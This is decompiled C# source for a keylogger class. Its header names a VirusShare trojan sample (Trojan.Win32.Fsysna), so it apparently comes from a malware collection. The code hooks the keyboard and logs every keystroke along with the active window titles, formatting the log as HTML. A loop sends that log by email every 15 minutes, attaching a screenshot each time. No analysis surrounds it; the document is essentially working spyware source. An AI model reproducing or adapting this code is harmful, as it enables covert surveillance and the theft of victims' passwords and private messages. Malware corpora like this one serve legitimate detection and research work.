// Decompiled with JetBrains decompiler
// Type: Project_Unamed.Keylogger
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Project_Unamed
{
  public class Keylogger
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    [AccessedThroughProperty("kbHook")]
    private static KeyboardHook _kbHook;
    private static string Log = "";
    private static long m_LastHwnd = 0;

    [DebuggerNonUserCode]
    public Keylogger() => Keylogger.__ENCAddToList((object) this);

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Keylogger.__ENCList)
      {
        if (Keylogger.__ENCList.Count == Keylogger.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Keylogger.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Keylogger.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Keylogger.__ENCList[index1] = Keylogger.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Keylogger.__ENCList.RemoveRange(index1, checked (Keylogger.__ENCList.Count - index1));
          Keylogger.__ENCList.Capacity = Keylogger.__ENCList.Count;
        }
        Keylogger.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    private static KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => Keylogger._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        KeyboardHook.KeyDownEventHandler downEventHandler = new KeyboardHook.KeyDownEventHandler(Keylogger.kbHook_KeyDown);
        if (Keylogger._kbHook != null)
          KeyboardHook.KeyDown -= downEventHandler;
        Keylogger._kbHook = value;
        if (Keylogger._kbHook == null)
          return;
        KeyboardHook.KeyDown += downEventHandler;
      }
    }

    public static void Initialize()
    {
      Keylogger.kbHook = new KeyboardHook();
      Keylogger.Log = "";
      EventLogger.LogEvent("Initializing keylogger...", " Keylogger");
      EventLogger.LogEvent("Keyboardhook set.", nameof (Keylogger));
      EventLogger.LogEvent("Starting loop if nessecary... [" + Conversions.ToString(Settings.KeylogReport15Min) + "]", nameof (Keylogger));
      if (!Settings.KeylogReport15Min)
        return;
      new Thread(new ThreadStart(Keylogger.LoopLog)).Start();
    }

    public static void LoopLog()
    {
      EventLogger.LogEvent("Loop started.", nameof (Keylogger));
      while (true)
      {
        Thread.Sleep(900000);
        Keylogger.SendLog();
      }
    }

    public static string GetLog()
    {
      string log = Keylogger.Log;
      Keylogger.Log = "";
      return log;
    }

    public static void SendLog()
    {
      string body = Keylogger.GetLog().Replace("\r\n", "<br>");
      EventLogger.LogEvent("Sending keylog report", nameof (Keylogger));
      Mailer.Send(body, Settings.MailStart + "Keylog Report", (Stream) Functions.GetScreenshot(), "Screen.jpg", true);
    }

    private static string GetKey(Keys e)
    {
      Keys keys = e;
      if (keys >= Keys.A && keys <= Keys.Z)
        return Control.IsKeyLocked(Keys.Capital) | (Control.ModifierKeys & Keys.Shift) != Keys.None ? e.ToString() : e.ToString().ToLower();
      if (keys >= Keys.D0 && keys <= Keys.D9)
      {
        if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
          return e.ToString().Replace("D", (string) null);
        string Left = e.ToString();
        if (Operators.CompareString(Left, "D1", false) == 0)
          return "!";
        if (Operators.CompareString(Left, "D2", false) == 0)
          return "@";
        if (Operators.CompareString(Left, "D3", false) == 0)
          return "#";
        if (Operators.CompareString(Left, "D4", false) == 0)
          return "$";
        if (Operators.CompareString(Left, "D5", false) == 0)
          return "%";
        if (Operators.CompareString(Left, "D6", false) == 0)
          return "^";
        if (Operators.CompareString(Left, "D7", false) == 0)
          return "&";
        if (Operators.CompareString(Left, "D8", false) == 0)
          return "*";
        if (Operators.CompareString(Left, "D9", false) == 0)
          return "(";
        if (Operators.CompareString(Left, "D0", false) == 0)
          return ")";
      }
      else
      {
        if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
          return e.ToString().Replace("NumPad", (string) null);
        if (keys >= Keys.Multiply && keys <= Keys.Divide)
        {
          string Left = e.ToString();
          if (Operators.CompareString(Left, "Divide", false) == 0)
            return "/";
          if (Operators.CompareString(Left, "Multiply", false) == 0)
            return "*";
          if (Operators.CompareString(Left, "Subtract", false) == 0)
            return "-";
          if (Operators.CompareString(Left, "Add", false) == 0)
            return "+";
          if (Operators.CompareString(Left, "Decimal", false) == 0)
            return ".";
        }
        else
        {
          if (keys == Keys.Space)
            return " ";
          if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
          {
            if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
            {
              string Left = e.ToString();
              if (Operators.CompareString(Left, "OemMinus", false) == 0)
                return "_";
              if (Operators.CompareString(Left, "Oemplus", false) == 0)
                return "+";
              if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
                return "{";
              if (Operators.CompareString(Left, "Oem6", false) == 0)
                return "}";
              if (Operators.CompareString(Left, "Oem5", false) == 0)
                return "|";
              if (Operators.CompareString(Left, "Oem1", false) == 0)
                return ":";
              if (Operators.CompareString(Left, "Oem7", false) == 0)
                return "\"";
              if (Operators.CompareString(Left, "Oemcomma", false) == 0)
                return "<";
              if (Operators.CompareString(Left, "OemPeriod", false) == 0)
                return ">";
              if (Operators.CompareString(Left, "OemQuestion", false) == 0)
                return "?";
              if (Operators.CompareString(Left, "Oemtilde", false) == 0)
                return "~";
            }
            else
            {
              string Left = e.ToString();
              if (Operators.CompareString(Left, "OemMinus", false) == 0)
                return "-";
              if (Operators.CompareString(Left, "Oemplus", false) == 0)
                return "=";
              if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
                return "[";
              if (Operators.CompareString(Left, "Oem6", false) == 0)
                return "]";
              if (Operators.CompareString(Left, "Oem5", false) == 0)
                return "\\";
              if (Operators.CompareString(Left, "Oem1", false) == 0)
                return ";";
              if (Operators.CompareString(Left, "Oem7", false) == 0)
                return "'";
              if (Operators.CompareString(Left, "Oemcomma", false) == 0)
                return ",";
              if (Operators.CompareString(Left, "OemPeriod", false) == 0)
                return ".";
              if (Operators.CompareString(Left, "OemQuestion", false) == 0)
                return "/";
              if (Operators.CompareString(Left, "Oemtilde", false) == 0)
                return "`";
            }
          }
          else
            return keys == Keys.Return ? Conversions.ToString(Operators.AddObject(Operators.AddObject(Keylogger.GenHtmlCode("#4169E1"), (object) "[Enter]</font>"), (object) "\r\n")) : Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Keylogger.GenHtmlCode("#4169E1"), (object) "["), (object) e.ToString()), (object) "]"), (object) "</font>"));
        }
      }
      return (string) null;
    }

    private static object GenHtmlCode(string c) => (object) ("<font color=\"" + c + "\">");

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowTextLength(int hwnd);

    [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private static void kbHook_KeyDown(Keys Key)
    {
      long foregroundWindow = (long) Keylogger.GetForegroundWindow();
      if (Keylogger.m_LastHwnd != foregroundWindow)
      {
        Keylogger.m_LastHwnd = foregroundWindow;
        Keylogger.Log = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Keylogger.Log + "\r\n" + "\r\n"), Keylogger.GenHtmlCode("00008B")), (object) "[<b>Switched to window</b>: "), (object) Keylogger.GetWindowTitle(checked ((int) foregroundWindow))), (object) " --<b>"), (object) DateAndTime.TimeOfDay), (object) "</b>--]"), (object) "</font>"), (object) "\r\n"), (object) "\r\n"));
      }
      Keylogger.Log += Keylogger.GetKey(Key);
    }

    private static string GetWindowTitle(int window_hwnd)
    {
      int num = checked (Keylogger.GetWindowTextLength(window_hwnd) + 1);
      if (num <= 1)
        return "<" + Conversions.ToString(window_hwnd) + ">";
      string lpString = Strings.Space(num);
      int windowText = Keylogger.GetWindowText(window_hwnd, ref lpString, num);
      return lpString.Substring(0, windowText);
    }
  }
}
